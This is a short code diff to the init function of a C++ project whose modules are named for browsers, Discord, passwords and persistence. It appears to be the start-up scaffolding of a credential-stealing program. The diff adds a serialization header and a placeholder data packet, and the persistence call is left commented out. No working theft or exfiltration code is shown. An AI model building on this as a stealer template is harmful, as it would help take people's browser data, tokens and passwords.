@@ -10,18 +10,25 @@
 * along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
 */
 
-
 #include "../../include/modules/initialize.hpp"
-
 #include "../../include/modules/browser/browser.hpp"
 #include "../../include/modules/discord/discord.hpp"
 #include "../../include/modules/passwords/passwords.hpp"
 #include "../../include/persistance/persistance.hpp"
+#include "../../include/util/serialization.hpp"
 
 void initialize::init(char* argv) {
     /*persistance* persist = new persistance(argv);
     persist->persist(argv);
     delete persist;*/
+
+    util::Packet packet;
+    util::File file;
+    file.buffer = (char*) "Du Knecht";
+    file.size = 10;
+    packet.file = file;
+    packet.name = "Knecht";
+
 
     browser* bro = new browser();
     discord* dis = new discord();
